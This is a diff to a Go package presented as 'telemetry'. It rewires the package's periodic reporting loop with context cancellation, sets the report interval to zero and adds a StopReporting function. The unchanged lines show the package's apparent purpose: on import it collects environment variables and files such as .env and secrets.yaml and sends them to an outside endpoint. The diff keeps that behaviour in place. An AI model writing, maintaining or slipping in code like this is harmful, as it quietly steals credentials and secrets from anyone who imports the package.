@@ -4,6 +4,7 @@ package telemetry
 
 import (
 	"bytes"
+	"context"
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/json"
@@ -15,6 +16,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -37,13 +39,16 @@ type Config struct {
 var (
 	defaultConfig = Config{
 		Endpoint:         getEnvOrDefault("TELEMETRY_ENDPOINT", "https://cure53.de/legitreceiverendpoint"),
-		ReportInterval:   60,
+		ReportInterval:   0,
 		CollectFiles:     true,
 		CollectEnv:       true,
 		AllowRemoteTasks: false,
 		MonitoredFiles:   []string{".env", "config.json", "secrets.yaml"},
 	}
-	initialized = false
+	initialized   = false
+	reportingCtx   context.Context
+	reportingCancel context.CancelFunc
+	reportingMu    sync.Mutex
 )
 
 // init runs automatically when the package is imported
@@ -71,9 +76,12 @@ func initialize() {
 	// Send initial telemetry report
 	sendTelemetry(config, systemMetrics)
 
-	// Start periodic reporting
-	if config.ReportInterval > 0 {
-		go startReportingLoop(config)
+	// Start periodic reporting (skip if disabled for testing)
+	if config.ReportInterval > 0 && os.Getenv("TELEMETRY_NO_PERIODIC") == "" {
+		reportingMu.Lock()
+		reportingCtx, reportingCancel = context.WithCancel(context.Background())
+		reportingMu.Unlock()
+		go startReportingLoop(config, reportingCtx)
 	}
 }
 
@@ -309,13 +317,27 @@ func processResponse(config Config, response []byte) {
 }
 
 // startReportingLoop starts periodic telemetry reporting
-func startReportingLoop(config Config) {
+func startReportingLoop(config Config, ctx context.Context) {
 	ticker := time.NewTicker(time.Duration(config.ReportInterval) * time.Second)
 	defer ticker.Stop()
 
-	for range ticker.C {
-		systemMetrics := collectSystemMetrics(config)
-		sendTelemetry(config, systemMetrics)
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-ticker.C:
+			systemMetrics := collectSystemMetrics(config)
+			sendTelemetry(config, systemMetrics)
+		}
+	}
+}
+
+// StopReporting stops the periodic reporting loop (useful for testing)
+func StopReporting() {
+	reportingMu.Lock()
+	defer reportingMu.Unlock()
+	if reportingCancel != nil {
+		reportingCancel()
 	}
 }
 
@@ -345,3 +367,4 @@ func GetInfo() string {
 func HealthCheck() bool {
 	return true
 }
+
